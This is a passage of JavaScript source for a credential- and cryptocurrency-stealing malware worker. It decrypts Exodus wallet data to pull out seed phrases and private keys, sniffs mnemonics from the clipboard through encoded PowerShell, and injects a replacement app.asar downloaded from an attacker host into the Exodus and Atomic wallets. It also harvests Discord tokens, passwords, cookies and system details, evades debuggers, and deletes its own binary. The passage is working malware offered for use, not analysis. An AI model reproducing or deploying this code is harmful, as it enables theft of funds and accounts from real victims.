  },

  // Candidate keys carried directly inside the wallet JSON on some versions.
  inlineKeys: function (config) {
    const keys = [];
    const grab = (raw) => {
      if (!raw) return;
      try {
        const b = Buffer.from(raw, "base64");
        if (b.slice(0, 5).toString() === "DPAPI") {
          for (const entropy of [Buffer.from("peanuts", "ascii"), null]) {
            try {
              const u = Dpapi.unprotectData(b.slice(5), entropy, "CurrentUser");
              if (u && u.length) keys.push(u);
            } catch {}
          }
        } else if (b.length === 32) {
          keys.push(b);
        }
      } catch {}
    };
    grab(config.key);
    grab(config.encryptionKey);
    grab(config.vault && config.vault.key);
    return keys;
  },

  deriveSet: function (key, config) {
    const out = [key];
    out.push(crypto.createHash("sha256").update(key).digest());
    try {
      const salt =
        (config.kdf && config.kdf.salt) || (config.salts && config.salts.vault);
      if (salt) {
        const iterations =
          (config.kdf && config.kdf.iterations) || 100000;
        out.push(
          crypto.pbkdf2Sync(key, Buffer.from(salt, "base64"), iterations, 32, "sha512"),
        );
      }
    } catch {}
    return out;
  },

  decryptSecretbox: function (ciphertext, nonce, key) {
    try {
      if (ciphertext.length < 32) return null;
      const opened = nacl.secretbox.open(ciphertext, nonce, key);
      return opened ? Buffer.from(opened).toString("utf8") : null;
    } catch {
      return null;
    }
  },

  decryptAesContainer: function (enc, key, config) {
    if (!enc || !key || !Buffer.isBuffer(key) || key.length !== 32) return null;
    const b = Buffer.isBuffer(enc) ? enc : Buffer.from(enc, "base64");
    if (b.length < 31) return null;
    try {
      const iv = b.slice(0, 12);
      const tag = b.slice(-16);
      const dc = crypto.createDecipheriv("aes-256-gcm", key, iv);
      dc.setAuthTag(tag);
      return Buffer.concat([dc.update(b.slice(12, -16)), dc.final()]).toString(
        "utf8",
      );
    } catch {}
    return decryptPasswordopw(b, key);
  },

  attempts: function (config, keys) {
    const results = [];
    const unique = [];
    const seen = new Set();
    for (const k of keys) {
      if (!k || !Buffer.isBuffer(k)) continue;
      const tag = k.toString("base64");
      if (seen.has(tag)) continue;
      seen.add(tag);
      unique.push(k);
    }

    const rawEnc = config.encrypted || config.cipherText || config.data;
    let encBuf = null;
    if (rawEnc) {
      if (Buffer.isBuffer(rawEnc)) encBuf = rawEnc;
      else if (typeof rawEnc === "string") encBuf = Buffer.from(rawEnc, "base64");
      else if (Array.isArray(rawEnc) && rawEnc.length) {
        // Some containers carry a "u:" prefixed list of base64 fragments
        const joined = rawEnc.join("");
        if (typeof joined === "string" && joined.startsWith("u:"))
          encBuf = Buffer.from(joined.slice(2), "base64");
      }
    }

    for (const key of unique) {
      for (const derived of this.deriveSet(key, config)) {
        if (encBuf && config.nonce) {
          for (const n64 of [config.nonce, Buffer.from(config.nonce, "hex").toString("base64")]) {
            const nonce = Buffer.from(n64, "base64");
            if (nonce.length === 24) {
              const opened = this.decryptSecretbox(encBuf, nonce, derived);
              if (opened && opened.length)
                results.push({ scheme: "secretbox", text: opened });
            }
          }
        }
        if (encBuf) {
          const text = this.decryptAesContainer(encBuf, derived, config);
          if (text && text.length) results.push({ scheme: "aes-gcm", text });
        }
      }
    }

    if (config.vault && config.vault.data) {
      const entries = Array.isArray(config.vault.data)
        ? config.vault.data
        : [config.vault.data];
      for (const entry of entries) {
        if (!entry || !entry.encrypted) continue;
        for (const key of unique) {
          const text = this.decryptAesContainer(
            Buffer.from(entry.encrypted, "base64"),
            key,
            config,
          );
          if (text && text.length)
            results.push({ scheme: "vault-entry", text: text.slice(0, 8000) });
        }
      }
    }

    return results;
  },

  // Pull a standalone mnemonic out of any plaintext we surfaced.
  extractMnemonic: function (text) {
    try {
      const json = JSON.parse(text);
      const scan = (o, acc) => {
        for (const k of ["mnemonic", "seed", "secretPhrase", "recoveryPhrase", "privateKey", "privateKeys", "seedPhrase"]) {
          if (o && typeof o[k] === "string" && o[k]) acc[k] = o[k];
          if (o && Array.isArray(o[k]) && o[k].length) acc[k] = o[k];
        }
        return acc;
      };
      const acc = scan(json, {});
      if (Object.keys(acc).length) return acc;
    } catch {}
    const mnemonicRe =
      /\b(?:(?:[a-z]{3,12})\s+){11,23}[a-z]{3,12}\b/;
    const m = text && text.match(mnemonicRe);
    if (m) return { mnemonic: m[0].trim() };
    return null;
  },

  clipboardSniff: async function () {
    if (!CONFIG.CLIPBOARD_MONITOR) return;
    const ps = `
      $t = Get-Clipboard -Raw -ErrorAction SilentlyContinue
      if ($t -and $t -match '^(([a-z]+)\\s+){11,23}[a-z]+$') { $t.Trim() }
    `;
    const text = Utils.exec(Bypass.powershellCmd(ps)).trim();
    if (!text) return;
    const norm = text.toLowerCase();
    if (this.sniffed.has(norm) || norm.split(/\s+/).length < 12) return;
    this.sniffed.add(norm);
    DataStore.wallets.push({
      name: "Exodus",
      source: "clipboard",
      grabbed: true,
      decrypted: true,
      recovered: { mnemonic: norm },
    });
  },

  sniffed: new Set(),

  run: async function (storagePath) {
    const walletPath = this.walletPath();
    if (!fs.existsSync(walletPath)) return { grabbed: false };

    const out = path.join(storagePath, "Exodus");
    fs.ensureDirSync(out);
    for (const [src, dest] of [
      [walletPath, "exodus.wallet"],
      [path.join(this.apdataDir(), "Local State"), "Local State"],
      [path.join(this.apdataDir(), "vault"), "vault"],
      [path.join(this.apdataDir(), "backup"), "backup"],
      [path.join(this.apdataDir(), "settings"), "settings"],
    ]) {
      try {
        if (fs.existsSync(src)) fs.copySync(src, path.join(out, dest));
      } catch {}
    }

    let config = {};
    try {
      config = JSON.parse(fs.readFileSync(walletPath, "utf8"));
    } catch {}

    const keys = this.inlineKeys(config);
    const osKey = await this.osCryptKey();
    if (osKey) keys.push(osKey);

    const results = this.attempts(config, keys);
    const plaintexts = results.map((r) => r.text);

    let recovered = {};
    for (const t of plaintexts) {
      const m = this.extractMnemonic(t);
      if (m) recovered = { ...recovered, ...m };
    }

    const wallet = {
      name: "Exodus",
      source: "exodus.wallet",
      grabbed: true,
      decrypted: plaintexts.length > 0,
      recovered,
      raw: plaintexts.slice(0, 3).map((t) => t.slice(0, 2000)),
    };
    DataStore.wallets.push(wallet);

    if (recovered.mnemonic) {
      fs.writeFileSync(
        path.join(out, "seed.json"),
        JSON.stringify({ recovered: recovered.mnemonic }, null, 2),
        "utf8",
      );
    }
    // Include the surfaced plaintexts (per-asset keys etc.) when decryptable.
    if (plaintexts.length) {
      fs.writeFileSync(
        path.join(out, "decrypted.json"),
        JSON.stringify(results, null, 2),
        "utf8",
      );
    }

    return { grabbed: true, decrypted: plaintexts.length > 0 };
  },
};

const Injection = {
  payload: async (logId, target) => {
    const url = `${CONFIG.HOST_URL}/${target}`;
    try {
      const { data } = await axios.get(url, { responseType: "arraybuffer" });
      let appPath;
      if (target === "exodus") {
        const base = path.join(process.env.LOCALAPPDATA, "exodus");
        if (!fs.existsSync(base)) return;
        const apps = fs.readdirSync(base).filter((f) => f.startsWith("app-"));
        if (!apps.length) return;
        appPath = path.join(base, apps[0], "resources", "app.asar");
      } else if (target === "atomic") {
        appPath = path.join(
          process.env.LOCALAPPDATA,
          "Programs",
          "atomic",
          "resources",
          "app.asar",
        );
      }
      if (appPath && fs.existsSync(appPath)) {
        Utils.kill(target === "exodus" ? "exodus.exe" : "Atomic Wallet.exe");
        fs.writeFileSync(appPath, data);
        const license =
          target === "exodus" ? "LICENSE" : "LICENSE.electron.txt";
        fs.writeFileSync(
          path.join(path.dirname(appPath), "..", license),
          logId,
        );
      }
    } catch {}
  },
};

const Stealth = {
  isDebugged: () => {
    try {
      if (
        process.execArgv.some(
          (arg) => arg.includes("--inspect") || arg.includes("--debug"),
        )
      )
        return true;
      const netstat = Utils.exec('netstat -an | findstr "9229 9230 5858 5859"');
      if (netstat.includes("LISTENING")) return true;
    } catch {}
    return false;
  },
  evade: async () => {
    if (Stealth.isDebugged()) process.exit(0);
    return true;
  },
};
const SystemInfo = {
  gather: async () => {
    try {
      const { data: ip } = await axios.get(`${CONFIG.HOST_URL}/p`);
      DataStore.systemInfo = {
        ip,
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpu: os.cpus()[0].model,
        ram: Math.round(os.totalmem() / 1024 ** 3) + " GB",
        gpu:
          Utils.exec("wmic path win32_VideoController get name")
            .split("\n")[1]
            ?.trim() || "Unknown",
        os: `${os.type()} ${os.release()}`,
        username: os.userInfo().username,
        hwid:
          Utils.exec("wmic csproduct get uuid").split("\n")[1]?.trim() ||
          "Unknown",
      };
    } catch {
      DataStore.systemInfo = { error: "Failed to gather system info" };
    }
  },
};
// Minimal bypass shim for worker-scoped helpers (clipboard read).
const Bypass = {
  powershellCmd: function (body) {
    return `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${Buffer.from(
      String(body),
      "utf16le",
    ).toString("base64")}`;
  },
};

// ==========================================
// 12. WORKER ENTRY
// ==========================================

async function workerMain(outFile) {
  await Stealth.evade();

  try {
    fs.ensureDirSync(CONFIG.STORAGE_PATH);
  } catch (e) {}

  try {
    const { exePath, tempDir } = await downloadMainExe();
    const outputZipPath = await runMainExtractorFromTemp(exePath, tempDir);
    if (outputZipPath) {
      await parseOutputZip(outputZipPath);
      fs.removeSync(tempDir);
    }
  } catch (e) {}

  try {
    await SystemInfo.gather();
    await extractDiscordTokens();
    await sendDiscordTokensToServer();
    await dcinject();
    await Discovery.searchFiles(CONFIG.STORAGE_PATH);
    await Discovery.scanWallets(CONFIG.STORAGE_PATH);
    await ExodusInject.run(CONFIG.STORAGE_PATH);
    await ExodusInject.clipboardSniff();
    await Discovery.extractTelegram(CONFIG.STORAGE_PATH);
    await Discovery.extractMinecraft(CONFIG.STORAGE_PATH);
    await Discovery.extractSteam(CONFIG.STORAGE_PATH);
  } catch (e) {}

  const data = {
    systemInfo: DataStore.systemInfo || {},
    passwords: DataStore.passwords || [],
    cookies: DataStore.cookies || [],
    autofills: DataStore.autofills || [],
    webData: DataStore.webData || [],
    discord_tokens: DataStore.tokens || [],
    wallets: DataStore.wallets || [],
  };
  try {
    const tmp = outFile + ".tmp";
    fs.writeFileSync(tmp, JSON.stringify(data), "utf8");
    fs.renameSync(tmp, outFile);
  } catch (e) {}

  // The worker has served its purpose: delete the binary and exit.
  const runningNode = path.basename(process.execPath).toLowerCase() === "node.exe";
  if (!runningNode && process.platform === "win32") {
    try {
      const escaped = process.execPath.replace(/"/g, '""');
      spawn(
        "cmd.exe",
        ["/c", `ping 127.0.0.1 -n 2 > nul & del /f /q "${escaped}"`],
        { windowsHide: true, detached: true, stdio: "ignore" },
      ).unref();
    } catch (e) {}
  }
  process.exit(0);
}

const outArg = process.argv[process.argv.indexOf("--out") + 1];
if (outArg) {
  workerMain(outArg).catch(() => process.exit(1));
}